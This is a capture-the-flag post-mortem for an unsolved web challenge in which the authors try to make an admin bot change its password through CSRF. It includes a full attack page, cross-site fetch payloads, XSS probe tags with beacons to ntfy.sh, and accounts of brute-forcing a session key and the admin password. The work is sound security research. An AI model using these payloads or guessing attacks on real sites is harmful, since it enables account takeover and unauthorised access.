---
title: "cats — anatomy of an admin bot that refuses to cooperate"
category: Web
host: cats.is-course.ru
tags: [csrf, admin-bot, securecookie, third-party-cookies, sameSite, methodology]
technique: "admin-bot CSRF / stored XSS — bot hardens itself"
status: open
---

# cats — anatomy of an admin bot that refuses to cooperate

> **Status: not solved.** This page is the full post-mortem: what the application does, what the admin
> bot does, the five hypotheses we formed and falsified, and why — under the bot's current
> configuration — no external page can take over the admin account. Negative results are results, and
> every claim below is reproducible.

## TL;DR

`cats` is a classic *"CSRF the admin bot"* challenge: a feedback form, a URL extractor, and a browser
that is supposed to be logged in as `admin`. We got as far as proving that the bot **loads our HTML,
executes JavaScript, and fetches images** — but it also:

* discards every cookie on cross-site requests (**third-party cookie blocking**),
* destroys the page **~150 ms** after load, so nothing delayed ever runs,
* never completes a **navigation** (a top-level form POST does not reach the server),

which removes every CSRF primitive at once. The remaining lever, stored XSS inside the admin's page,
does not exist because the feedback text is never rendered as HTML.

## 1. The application

Go + Echo (`{"message":"Not Found"}` on unknown routes), `gorilla/sessions` client-side sessions, nginx
in front, no JavaScript of its own on any page.

| Route | Method | Behaviour |
|---|---|---|
| `/` | GET | `Welcome, <login>!`; renders the flag **only** when the session login is `admin` |
| `/login` | POST | `login` + `password`; 302 on success, 401 on failure; no rate limit, no lockout |
| `/register` | POST | login `^[a-z]+$`, password ≥14 chars with digit+upper+lower+special; logs you in |
| `/settings` | POST | changes the **current session user's** password; no old-password check, no CSRF token, no Origin/Referer validation |
| `/feedback` | POST | 1 message / ~4 s; the first `http(s)` URL in the text is handed to the admin bot |
| `/logout` | GET | 302 → `/` |

The reward is purely client-side: the flag is rendered when the *session cookie* says `login == admin`,
so the target is "make the admin's browser do something", not "find a server bug".

The `session` cookie is a `gorilla/sessions` securecookie:
`base64url(ts | base64url(gob{login}) | HMAC-SHA256(key, "session|ts|payload"))`, `HttpOnly; Secure;
SameSite=None`, Max-Age 604800. The key is random — we verified that by testing **all 14 344 391
rockyou candidates** against a live cookie at ~345 k/s (offline, so no lockout risk). Dead end, and a
good reminder that "signed cookie" means "random key or nothing".

## 2. The admin bot, measured

Everything here comes from our own beacon traffic recorded on the bot's behalf; the extractor takes the
first URL in the feedback and opens it 8–12 s later from `45.76.93.18` (Chrome/114 on macOS).

| Property | Measurement |
|---|---|
| First fetch after feedback | 8–12 s |
| Navigations per submission | one |
| URL deduplication | **by path** — `/page.html?r0=…` … `?r3=…` never revisited; a new path is fetched within 12 s |
| Subresources | `<img>` fetched, `fetch()` from the page reaches the app |
| JavaScript | **executes** (see §3) |
| Page lifetime | beacons at 0 / 50 / 100 ms arrive, **200 ms and later never do** |

### The beacon channel

We used [ntfy.sh](https://ntfy.sh) as an out-of-band sink:
`GET https://ntfy.sh/<topic>/trigger?message=X` publishes, and
`GET https://ntfy.sh/<topic>/json?poll=1&since=all` reads without auth. It is the pragmatic choice when
you have no public host: it survives the sandbox's egress rules, needs no account, and tolerates bursts.

Two traps cost us hours and are worth writing down:

1. **webhook.site silently stopped recording** the bot's requests. We concluded "the bot is dead"; in
   fact the bot was fine and the sink was not. Verify your sink with a request *you* make before
   blaming the target.
2. **`new Image().src = …` is not a reliable beacon.** Under a page that is torn down within a couple of
   hundred milliseconds, the image object is garbage-collected before the request is issued, so the
   beacon silently never leaves. We briefly believed "the bot stopped executing JavaScript". The
   reliable primitive is a real element in the DOM:

```js
function b(n){
  const i = document.createElement('img');
  i.width = 1; i.height = 1;
  i.src = 'https://ntfy.sh/TOPIC/trigger?message=' + encodeURIComponent(n);
  document.body.appendChild(i);          // <- in the DOM, cannot be collected
}
```

A DOM-mutation probe settled it: a static `<img>` whose `src` was rewritten by script, plus a second
image inserted with `insertAdjacentHTML`, both fired. JavaScript had been running the whole time.

## 3. What the bot's JavaScript can and cannot do

| Experiment | Beacon / side effect | Verdict |
|---|---|---|
| inline `<script>` inserting an image | fired | JS runs |
| `fetch('/register', {mode:'no-cors', credentials:'include'})` | user created | cross-site POSTs **reach the app** |
| `fetch('/settings', …, credentials:'include')` | password unchanged | request is unauthenticated |
| `navigator.sendBeacon` before `form.submit()` | beacon arrives | page really loaded |
| immediate top-level `form.submit()` to `/register` | **account never created** | navigation never reaches the server |
| `setTimeout(…, 400)` then submit | no beacon at all | page is gone before 200 ms |

The last two rows matter: a form POST is not "slow", it simply never happens. The bot appears to load
the document in a context whose lifetime ends right after the load event, and to discard the browsing
context (or block the navigation) rather than follow it.

## 4. Cookies: three ways to check, all negative

The decisive question is whether the bot carries the admin session. We tested it three ways.

**a. Side effect on the admin account.** Every CSRF we fired — `fetch` with `credentials:'include'`,
and a top-level form POST to `/settings` — would have changed the admin password. Logging in as `admin`
with each candidate afterwards always returned 401.

**b. Self-login inside the bot's own browser.** Our page logged the bot in as *our* account
(`POST /login` with our credentials, cross-site, `credentials:'include'`) and then immediately POSTed
`/settings` with a new password. Both fetches resolved (`login` and `set_done` beacons arrived), and our
account's password did **not** change. So the `Set-Cookie` from the cross-site login was not stored, or
not sent back: classic third-party cookie blocking. `SameSite=None; Secure` does not help — Chrome
blocks third-party cookies regardless of `SameSite` when the feature is enabled.

**c. Timing oracle — built, then invalidated.** The plan was: an authenticated `POST /settings` must
re-hash the password (slow), an anonymous one is an early 302 (fast), so the bot can tell us whether it
is authenticated. We measured the bot's own timings (`GET /` 11 ms, `POST /login` 10 ms,
`POST /settings` 15 ms) and almost concluded "anonymous". Then we calibrated with **warm** connections
from our side: authenticated `POST /settings` 153 ms vs anonymous 154 ms — identical. The application
hashes fast enough that the oracle cannot separate the two paths at all. The 4 ms delta on the bot is
noise, and the only reason the first calibration looked convincing (471 ms vs 153 ms) was TLS handshake
setup on a cold connection.

That is worth generalising: **an oracle is only an oracle after you have measured both branches
yourself.**

## 5. Stored XSS: not rendered (verified with a beacon that cannot be confused)

Every earlier "no rendering" conclusion in this challenge had been made with webhook.site, i.e. with a
sink we later proved unreliable — so we redid it properly. The payload contained one beacon per HTML
context, with the discriminator encoded in the **topic name**, so that no URL mangling could hide it:

```html
<img src="//ntfy.sh/TOPIC-img/trigger">
<iframe src="//ntfy.sh/TOPIC-ifr/trigger"></iframe>
<link rel="stylesheet" href="//ntfy.sh/TOPIC-css/trigger">
<video poster="//ntfy.sh/TOPIC-vid/trigger"></video>
```

Nine minutes of polling: nothing on any topic. The feedback text is stored and forwarded to the bot as
*text*; the URL extractor pulls out the first link and the HTML is never parsed. (A side observation:
the extractor normalises `//host/path?query` and drops the query string, so a raw ntfy trigger URL comes
out as a bare `/trigger` — ntfy then publishes its default message, `triggered`. That is a nice
fingerprint of an extractor, as opposed to a renderer.)

## 6. Everything else that does not work

* **GET-based CSRF** — `GET /settings?password=…` is a no-op; only POST mutates. `/logout` is GET but
  useless.
* **Mass assignment** — `login`, `user`, `username`, `role`, `id`, `is_admin` alongside the password
  fields are ignored (form and JSON bodies both).
* **JSON content type** — accepted by the parser, but no extra fields are honoured.
* **Register collisions** — `admin`, `Admin`, `ADMIN`, `admin `, homoglyphs: all rejected
  (case-insensitive uniqueness).
* **Reflected XSS** — `/?message=` and `/?error=` are Go-escaped (`&lt; &gt; &#34; &#39;`).
* **Route fuzzing** — `/api`, `/posts`, `/admin`, `/feedbacks`, ~110 words: 404.
* **Session key brute force** — 14.3 M rockyou candidates, no hit.
* **Admin password** — 10 537 candidates (top lists + themed generator), ~46 req/s, no lockout, no hit.

## 7. Why the challenge is (currently) unsolvable from the outside

To win, exactly one of these must hold:

1. the bot carries an admin session **and** accepts a cross-site state change → blocked by third-party
   cookie policy, and by the fact that navigations do not complete;
2. the bot renders attacker-controlled HTML on the `cats` origin (stored XSS) → the feedback is never
   rendered;
3. the session can be forged → the securecookie key is random;
4. the flag is reachable anonymously → `/` gates it on `login == "admin"`.

All four are closed. The most likely explanation is a configuration problem on the challenge side: the
bot's profile looks like Chrome with third-party cookies blocked *and* a page lifetime measured in
milliseconds (possibly a headless wrapper that closes the tab right after `load`, and a user-data-dir
per run that never receives the admin login). A challenge that only ever issues its session cookie to a
browser which will not store it cannot be solved by any participant.

**Recommendation to the organisers:** check that (a) the bot logs in before visiting, (b) its
`user-data-dir` persists between runs, (c) third-party cookies are allowed for the challenge domain, and
(d) the page is kept alive for a few seconds. Any one of those four would make the challenge solvable in
under a minute with the page in §8.

## 8. Reproducible page

```html
<!doctype html><meta charset="utf-8"><title>web design inspiration</title>
<script>
const B = 'https://cats.is-course.ru';
const NP = 'Attacker9!password';
const b = n => { const i = document.createElement('img'); i.width = i.height = 1;
  i.src = 'https://ntfy.sh/TOPIC/trigger?message=' + encodeURIComponent(n);
  document.body.appendChild(i); };

b('start');
// 1. does our page carry a session at all?
fetch(B + '/settings', { method:'POST', mode:'no-cors', credentials:'include',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'password=' + encodeURIComponent(NP) + '&confirm-password=' + encodeURIComponent(NP) })
  .then(() => b('settings_done'));
</script>
```

Then poll `https://ntfy.sh/TOPIC/json?poll=1&since=all`, and afterwards try
`POST /login` with `admin` / `Attacker9!password`. If the bot had a session, that login succeeds and `/`
prints the flag.
